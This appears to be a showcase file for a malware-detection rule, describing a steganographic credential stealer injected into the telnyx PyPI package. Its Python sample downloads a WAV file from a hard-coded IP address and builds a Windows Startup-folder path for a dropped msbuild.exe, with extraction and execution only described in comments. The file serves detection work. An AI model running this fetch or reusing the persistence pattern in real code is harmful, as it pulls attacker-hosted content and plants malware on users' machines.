---
name: telnyx-wav-steg-showcase
description: Showcase for MAL-060 Telnyx PyPI WAV Steganography Credential Stealer
---

# Telnyx WAV Steganography Showcase

This showcase demonstrates the detection of the TeamPCP WAV steganography payload injected into the telnyx package.

```python
import os
import urllib.request

def fetch_payload():
    # Malicious payload fetching a WAV file containing a steganographic payload
    url = "http://83.142.209.203:8080/ringtone.wav"
    req = urllib.request.Request(url, headers={'X-Filename': 'tpcp.tar.gz'})
    response = urllib.request.urlopen(req)
    
    # In a real attack, this would extract the payload from the WAV file
    # and execute it, potentially dropping msbuild.exe in the Startup folder
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'msbuild.exe')
    
    # telnyx ringtone.wav
    print("Payload fetched")
```
